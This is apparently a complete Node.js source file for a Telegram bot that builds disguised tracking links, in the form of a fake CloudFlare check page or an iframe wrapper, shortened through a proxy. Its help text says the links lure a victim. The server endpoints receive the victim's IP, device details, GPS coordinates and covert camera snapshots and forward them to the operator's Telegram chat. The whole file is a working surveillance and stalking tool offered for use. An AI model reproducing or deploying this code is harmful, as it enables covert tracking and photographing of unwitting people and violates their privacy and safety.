const fs = require("fs");
const express = require("express");
var cors = require('cors');
var bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot(process.env["bot"], {
  polling: true
});
var jsonParser = bodyParser.json({
  limit: 1024 * 1024 * 20,
  type: 'application/json'
});
var urlencodedParser = bodyParser.urlencoded({
  extended: true,
  limit: 1024 * 1024 * 20,
  type: 'application/x-www-form-urlencoded'
});
const app = express();
app.use(jsonParser);
app.use(urlencodedParser);
app.use(cors());
app.set("view engine", "ejs");

//Modify your URL here
var hostURL = "YOUR URL";
//TOGGLE for 1pt Proxy and Shorters
var use1pt = true;



app.get("/w/:path/:uri", (req, res) => {
  var ip;
  var d = new Date();
  d = d.toJSON().slice(0, 19).replace('T', ':');
  if (req.headers['x-forwarded-for']) {
      ip = req.headers['x-forwarded-for'].split(",")[0];
  } else if (req.connection && req.connection.remoteAddress) {
      ip = req.connection.remoteAddress;
  } else {
      ip = req.ip;
  }
  if (req.params.path != null) {
    res.render("webview", {
      ip: ip,
      time: d,
      url: atob(req.params.uri),
      uid: req.params.path,
      a: hostURL,
      t: use1pt
    });
  } else {
    // res.redirect("https://example.com");
  }
});

app.get("/c/:path/:uri", (req, res) => {
  var ip;
  var d = new Date();
  d = d.toJSON().slice(0, 19).replace('T', ':');
  if (req.headers['x-forwarded-for']) {
    ip = req.headers['x-forwarded-for'].split(",")[0];
  } else if (req.connection && req.connection.remoteAddress) {
    ip = req.connection.remoteAddress;
  } else {
    ip = req.ip;
  }
  if (req.params.path != null) {
    res.render("cloudflare", {
      ip: ip,
      time: d,
      url: atob(req.params.uri),
      uid: req.params.path,
      a: hostURL,
      t: use1pt
    });
  } else {
    // res.redirect("https://example.com");
  }
});

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  if (msg?.reply_to_message?.text == "🌐 Enter your URL") {
    createLink(chatId, msg.text);
  }
  if (msg.text == "/start") {
    var m = {
      reply_markup: JSON.stringify({
        "inline_keyboard": [
          [{
            text: "CREATE THE LINK",
            callback_data: "crenew"
          }]
        ]
      })
    };
    bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to track any mobile phone or computer with a simple link.\nIt can collect information like device information, location, camera shots.\n\nType /help for more information.`, m);
  } else if (msg.text == "/create") {
    createNew(chatId);
  } else if (msg.text == "/help") {
    bot.sendMessage(chatId, `With this bot you can track any mobile phone or computer by sending a simple link.\n\nPress the START button or type '/start' without apostrophes and press enter to start, it will ask you for a URL that will be used in the iframe to lure the victim.\nAfter receiving the URL, it will send you two links, which you can use to track any mobile phone or computer.\n\nLink Method\n1. CloudFlare Link: This method will display a CloudFlare page to collect information and then redirect the victim to the destination URL.\n2. WebView Link: This method will display the URL using a frame and collect information. ( ⚠️ This method will not work on websites that use the X frame header )`);
  }
});

bot.on('callback_query', async function onCallbackQuery(callbackQuery) {
  bot.answerCallbackQuery(callbackQuery.id);
  if (callbackQuery.data == "crenew") {
    createNew(callbackQuery.message.chat.id);
  }
});

bot.on('polling_error', (error) => {
  //console.log(error.code);
});

async function createLink(cid, msg) {
  var encoded = [...msg].some(char => char.charCodeAt(0) > 127);
  if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1) && !encoded) {
    var url = cid.toString(36) + '/' + btoa(msg);
    var m = {
      reply_markup: JSON.stringify({
        "inline_keyboard": [
          [{
            text: "CREATE THE NEW LINK",
            callback_data: "crenew"
          }]
        ]
      })
    };
    var cUrl = `${hostURL}/c/${url}`;
    var wUrl = `${hostURL}/w/${url}`;
    bot.sendChatAction(cid, "typing");
    if (use1pt) {
      var x = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent("https://api.1pt.co/proxy?url="+cUrl)}`).then(res => res.json());
      var y = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent("https://api.1pt.co/proxy?url="+wUrl)}`).then(res => res.json());
      var f = "",
        g = "";
      for (var c in x) {
        f += x[c] + "\n";
      }
      for (var c in y) {
        g += y[c] + "\n";
      }
      bot.sendMessage(cid, `New link has been created successfully.\nURL: ${msg}\n\n✅ You can use any of the links below.\n\n🌐 CloudFlare page link\n${f}\n\n🌐 WebView page link\n${g}`, m);
    } else {
      bot.sendMessage(cid, `New link has been created successfully.\nURL: ${msg}\n\n✅ You can use any of the links below.\n\n🌐 CloudFlare page link\n${cUrl}\n\n🌐 WebView page link\n${wUrl}`, m);
    }
  } else {
    bot.sendMessage(cid, `⚠️ Please enter a valid URL with http or https!`);
    createNew(cid);
  }
}

function createNew(cid) {
  var mk = {
    reply_markup: JSON.stringify({
      "force_reply": true
    })
  };
  bot.sendMessage(cid, `🌐 Enter your URL`, mk);
}

app.get("/", (req, res) => {
  var ip;
  if (req.headers['x-forwarded-for']) {
    ip = req.headers['x-forwarded-for'].split(",")[0];
  } else if (req.connection && req.connection.remoteAddress) {
    ip = req.connection.remoteAddress;
  } else {
    ip = req.ip;
  }
  res.json({
    "ip": ip
  });
});

app.post("/location", (req, res) => {
  var lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
  var lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
  var uid = decodeURIComponent(req.body.uid) || null;
  var acc = decodeURIComponent(req.body.acc) || null;
  if (lon != null && lat != null && uid != null && acc != null) {
    bot.sendLocation(parseInt(uid, 36), lat, lon);
    bot.sendMessage(parseInt(uid, 36), `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
    res.send("Done");
  }
});

app.post("/", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var data = decodeURIComponent(req.body.data) || null;
  if (uid != null && data != null) {
    data = data.replaceAll("<br>", "\n");
    bot.sendMessage(parseInt(uid, 36), data, {
      parse_mode: "HTML"
    });
    res.send("Done");
  }
});

app.post("/camsnap", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var img = decodeURIComponent(req.body.img) || null;
  if (uid != null && img != null) {
    var buffer = Buffer.from(img, 'base64');
    var info = {
      filename: "camsnap.png",
      contentType: 'image/png'
    };
    try {
      bot.sendPhoto(parseInt(uid, 36), buffer, {}, info);
    } catch (error) {
      console.log(error);
    }
    res.send("Done");
  }
});

app.listen(5000, () => {
  console.log("App Running on Port 5000!");
});